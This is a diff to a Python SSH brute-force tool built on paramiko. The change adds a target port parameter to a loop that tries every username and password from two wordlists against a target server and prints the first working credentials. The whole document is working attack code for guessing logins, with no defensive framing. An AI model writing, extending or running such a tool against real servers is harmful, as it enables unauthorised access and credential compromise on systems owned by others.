@@ -25,7 +25,7 @@ print("""\033[96m
 
 
 
-def ssh_bruteforce(target_ip, username_wordlist, password_wordlist):
+def ssh_bruteforce(target_ip, target_port, username_wordlist, password_wordlist):
     client = paramiko.SSHClient()
     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
@@ -42,7 +42,7 @@ def ssh_bruteforce(target_ip, username_wordlist, password_wordlist):
             print(f"\033[94mTrying username: {username}, password: {password}\033[0m")
 
             try:
-                client.connect(target_ip, username=username, password=password, timeout=1, allow_agent=False, look_for_keys=False)
+                client.connect(hostname=target_ip, port=target_port, username=username, password=password, timeout=1, allow_agent=False, look_for_keys=False)
                 print(f"\033[93mSuccess! Username: {username}, Password: {password}\033[0m")
                 return username, password
             except paramiko.AuthenticationException:
@@ -59,12 +59,13 @@ def ssh_bruteforce(target_ip, username_wordlist, password_wordlist):
 def main():
     parser = argparse.ArgumentParser(description="SSH Brute-Forcing Tool with Username and Password Wordlists")
     parser.add_argument("target_ip", type=str, help="Target IP address of the SSH server")
+    parser.add_argument("target_port", type=int, help="Target Port of the SSH server")
     parser.add_argument("username_wordlist", type=str, help="Path to the username wordlist file")
     parser.add_argument("password_wordlist", type=str, help="Path to the password wordlist file")
     
     args = parser.parse_args()
 
-    ssh_bruteforce(args.target_ip, args.username_wordlist, args.password_wordlist)
+    ssh_bruteforce(args.target_ip, args.target_port, args.username_wordlist, args.password_wordlist)
 
 if __name__ == "__main__":
     main()
